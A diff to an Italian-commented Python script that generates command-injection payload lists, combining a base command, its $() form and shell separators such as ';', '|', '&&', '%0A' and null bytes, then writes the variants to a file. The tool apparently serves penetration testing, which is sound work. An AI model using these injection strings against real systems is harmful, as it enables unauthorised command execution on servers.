@@ -10,9 +10,12 @@ import sys
 # <COMANDO>
 # <PREFISSO><COMANDO>
 # <PREFISSO><COMANDO><SUFFISSO-1>
+# <COMANDO><SUFFISSO-1>
 # <PREFISSO><COMANDO><SUFFISSO-2>
+# <COMANDO><SUFFISSO-2>
 #...
 # <PREFISSO><COMANDO><SUFFISSO-n>
+# <COMANDO><SUFFISSO-n>
 def genera_comandi_manipolati(comando_base, prefissi, suffissi):
     comando_parentesi = f"$({comando_base})"
     varianti_comando = [comando_base, comando_parentesi]
@@ -27,8 +30,10 @@ def genera_comandi_manipolati(comando_base, prefissi, suffissi):
             comandi_generati.append(f"{prefisso}{variante}")
             
             # Aggiunge prefisso + tutti i suffissi
+            # Aggiunge anche solo i suffissi
             for suffisso in suffissi:
                 comandi_generati.append(f"{prefisso}{variante}{suffisso}")
+                comandi_generati.append(f"{variante}{suffisso}")
     
     return comandi_generati
     
@@ -45,8 +50,8 @@ if len(sys.argv) < 3:
 
 ip_address = sys.argv[1]
 file_in = sys.argv[2]
-prefissi = ["%00", "%0A"]
-suffissi = ["%00", "&", "?", "?%00", "#"]
+prefissi = ["%00 ", "%00; ", "%0A ", "|| ", "| ", "; ", "& ", "&& "]
+suffissi = ["%00 ", "%00; ", "%0A ", "? ", "?%00 ", "; ", "& ", "|| ", "| ", "-- ", "# "]
 with open(file_in, 'r') as f:
     with open('out-command-injection-list.txt', 'w') as out:
         for line in f:
